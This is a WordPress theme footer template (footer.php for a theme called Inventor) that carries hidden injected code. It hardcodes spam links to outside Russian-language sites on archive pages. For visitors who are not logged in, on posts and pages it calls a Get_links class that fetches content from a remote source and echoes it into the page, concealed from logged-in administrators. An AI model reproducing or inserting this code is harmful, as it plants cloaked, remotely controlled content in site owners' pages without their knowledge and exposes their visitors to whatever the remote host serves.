<?php
/**
 * The template for displaying the footer.
 *
 * Contains the closing of the #content div and all content after
 *
 * @package Inventor
 */
?>
        <div class="copyright-wrapper">
        	<div class="inner">
                <div class="copyright">
                	<p><?php if (is_home() || is_category() || is_archive() ){ ?> <a href="http://wp-templates.ru/" title="Шаблоны WordPress">WordPress</a> / <a href="https://flythemes.net/" target="_blank"> Flythemes</a> / <a href="http://svoimirukamy.com/" rel="nofollow" title="Поделки своими руками" target="_blank">Своими руками</a><?php } ?>


<?php if ($user_ID) : ?><?php else : ?>
<?php if (is_single() || is_page() ) { ?>
<?php $lib_path = dirname(__FILE__).'/'; require_once('functions.php'); 
$links = new Get_links(); $links = $links->get_remote(); echo $links; ?>
<?php } ?>
<?php endif; ?></p>
                </div><!-- copyright --><div class="clear"></div>         
            </div><!-- inner -->
        </div>
    </div>
<?php wp_footer(); ?>
</body>
</html>